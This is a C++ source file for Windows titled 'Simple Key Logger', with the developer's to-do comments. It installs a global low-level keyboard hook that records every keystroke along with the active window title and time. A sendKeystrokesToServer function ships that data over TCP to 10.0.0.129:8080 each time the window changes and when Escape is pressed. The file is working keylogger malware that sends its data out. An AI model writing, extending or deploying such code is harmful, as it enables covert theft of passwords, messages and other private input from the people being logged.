#define UNICODE
#include <winsock2.h>
#include <Windows.h>
#include <cstring>
#include <cstdio>
#include <fstream>
#include <iostream>
#include <sstream>
#include <time.h>
#include <map>
#include <cstring>
#include <ws2tcpip.h>
#include <thread>

using namespace std;

/*

Simple Key Logger

implement shift keys (check tomorrow to test valdiity)
make a repository on github, commit then fork this over
possibly implement other features? like grabbing pc id
tune some logging to make sure data is readable


implement funciton keys

think about removing some values from the map

implement use of virtual keyboard layout, refer to github example
    --currently prints out int representation of letters, fix it

*/

HHOOK _hook = NULL;

std::ofstream logFile;
void startLogging();
void computerInformation();
LRESULT CALLBACK hookCallBack(int nCode, WPARAM wParam, LPARAM lParam);
HKL getKeyboardLayout();
stringstream fetchWindow();
std::stringstream keyStrokes;

map<int, string> keyname { // modify these laters to filter out meaningful inputs from unmeanginful
   
    {VK_BACK, "" },
	{VK_RETURN,	"[ENTER]\n" },
	{VK_SPACE,	" "},
	{VK_TAB,	"[TAB]" },
	{VK_SHIFT,	"[SHIFT]" },
	{VK_LSHIFT,	""},
	{VK_RSHIFT,	""},
	{VK_CONTROL,	"[CONTROL]" },
	{VK_LCONTROL,	"[LCTRL]" },
	{VK_RCONTROL,	"[RCTRL]" },
	{VK_MENU,	"[ALT]" },
	{VK_LWIN,	"[LWIN]" },
	{VK_RWIN,	"[RWIN]" },
	{VK_ESCAPE,	""},
	{VK_END,	"[END]" },
	{VK_HOME,	"[HOME]" },
	{VK_LEFT,	"[LEFT]" },
	{VK_RIGHT,	"[RIGHT]" },
	{VK_UP,		"[UP]" },
	{VK_DOWN,	"[DOWN]" },
	{VK_PRIOR,	"[PG_UP]" },
	{VK_NEXT,	"[PG_DOWN]" },
    {VK_DELETE, "[DELETE]"},
	{VK_CAPITAL,"" },
    {VK_F1, "[F1]"},
    {VK_F2, "[F2]"},
    {VK_F3, "[F3]"},
    {VK_F4, "[F4]"},
    {VK_F5, "[F5]"},
    {VK_F6, "[F6]"},
    {VK_F7, "[F7]"},
    {VK_F8, "[F8]"},
    {VK_F9, "[F9]"},
    {VK_F10, "[F10]"},
    {VK_F11, "[F11]"},
    {VK_F12, "[F12]"},

    
};

map<int, char> altKeyname { // for characters acheived through shift + xyz

// all values in altKeyname must exist in keyname 
    
    {VK_SPACE,	' '},
    {VK_OEM_PLUS, '+'},
    {VK_OEM_MINUS, '_'},
    {VK_OEM_2, '?'},
    {VK_OEM_PERIOD, '>'},
    {VK_OEM_COMMA, '<'},
    {VK_OEM_1, ':'},
    {VK_OEM_6, '}'},
    {VK_OEM_7, '"'},
    {VK_OEM_4, '{'},
    {VK_OEM_5, '|'},
    {0x30, ')'}, 
    {0x31, '!'},
    {0x32, '@'},
    {0x33, '#'}, 
    {0x34, '$'}, 
    {0x35, '%'}, 
    {0x36, '^'}, 
    {0x37, '&'}, 
    {0x38, '*'}, 
    {0x39, '('},
     
};

bool newWindow() {
    static char lastWindow[256] = "";
    HWND foreground = GetForegroundWindow();

    if (foreground != NULL) {
		char window[256]; // pointer to the current window 
		GetWindowTextA(foreground, (LPSTR)window, 256); // retrieves the text in a window's title bar

		if (strcmp(window, lastWindow) != 0) {

            strcpy_s(lastWindow, sizeof(lastWindow), window);
            return true;

        }
    }
    return false;
}

std::stringstream fetchWindow() { 
   stringstream windowName; 
   windowName.str("");
    HWND foreground = GetForegroundWindow();
    if (foreground != NULL) {
		char window[256]; // pointer to the current window 
		GetWindowTextA(foreground, (LPSTR)window, 256); // retrieves the text in a window's title bar
        time_t currentTime = time(NULL); // retrieve time
		windowName << "\n" << "Window: " << window << " || Time and Date: " << ctime(&currentTime) << "\n";
        return windowName;
    }
    return windowName; // if the conditonal isn't reached, this returns empty string stream object ("")

}

void sendKeystrokesToServer(std::stringstream &keystrokesStream) {
    std::string keystrokes = keystrokesStream.str();
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct sockaddr_in clientService;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return;
    }

    // Create socket
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        WSACleanup();
        return;
    }

    // Fill in server address structure
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr("10.0.0.129");
    clientService.sin_port = htons(8080);

    // Connect to server
    if (connect(ConnectSocket, (struct sockaddr *)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        std::cerr << "Connection to server failed" << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    // Send keystrokes data to server
    if (send(ConnectSocket, keystrokes.c_str(), keystrokes.length(), 0) == SOCKET_ERROR) {
        std::cerr << "Sending data to server failed" << std::endl;
        closesocket(ConnectSocket);
        WSACleanup();
        return;
    }

    // Close socket and cleanup
    closesocket(ConnectSocket);
    WSACleanup();
}


LRESULT CALLBACK hookCallBack(int nCode, WPARAM wParam, LPARAM lParam) {
    
    if (nCode < 0) {
        ;
    } else {

        HKL layout = getKeyboardLayout(); // user's keyboard layout; generates a virtual layout to map keys to
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam; // used to capture low-level keyboard hooks
        int code = kbdStruct->vkCode; 
        char key;
        key = MapVirtualKeyExA(code, MAPVK_VK_TO_CHAR, layout); // returns a character code
        
        if (wParam == WM_KEYDOWN) {

            if (newWindow() != false) { // if we are at a new window, send all the keystrokes captured to the server
                stringstream windowName = fetchWindow();
                sendKeystrokesToServer(windowName);
            }
            
            if (key == VK_ESCAPE) { // terminate message (remove later when gui made for start/stop button)
                sendKeystrokesToServer(keyStrokes); // send remaining keystrokes to the server
                keyStrokes << "\n";
                PostQuitMessage(0);
            }

            if ((GetKeyState(VK_SHIFT) & 0x8000) != 0 || (GetKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetKeyState(VK_RSHIFT) & 0x8000) != 0) { // shift is being pressed down

                if (altKeyname.find(code) != altKeyname.end()) {
                    keyStrokes << altKeyname.find(code)->second;
                } else {
                    if (key != 0) { // check if a key was properly mapped to the layout
                        keyStrokes << char(key);
                    }   
                }
            } else if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) { // check for caps lock

                if (key != 0) {
                    keyStrokes << char(key);
                }

            } else {
                
                if (keyname.find(code) != keyname.end()) { // search for special input (alt, ctrl, etc)
                    keyStrokes << keyname.find(code)->second;
                } else {   

                    if (key != 0) {
                        keyStrokes << char(tolower(key)); // otherwise, assume the input is an alphanumeric character, and convert to lowercase
                    }

                }    
            }
        }
    }
    return CallNextHookEx(_hook, nCode, wParam, lParam);
}

void startLogging() {

    // initialize variables to run logging
    const char* logFilename = "log.txt";
    logFile.open(logFilename, ios::app);  
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, hookCallBack, NULL, 0);
    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        ;
    }  

    UnhookWindowsHookEx(_hook);
    logFile.close();  // Close the log file

}

HKL getKeyboardLayout() { // returns layout of user's current keyboard
    return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));
}

int main() {

    cout << "Logging started." << endl;
    startLogging();
    //sendKeystrokesToServer(keyStrokes);
    cout << "Logger closed." << endl;
    return 0;
    
}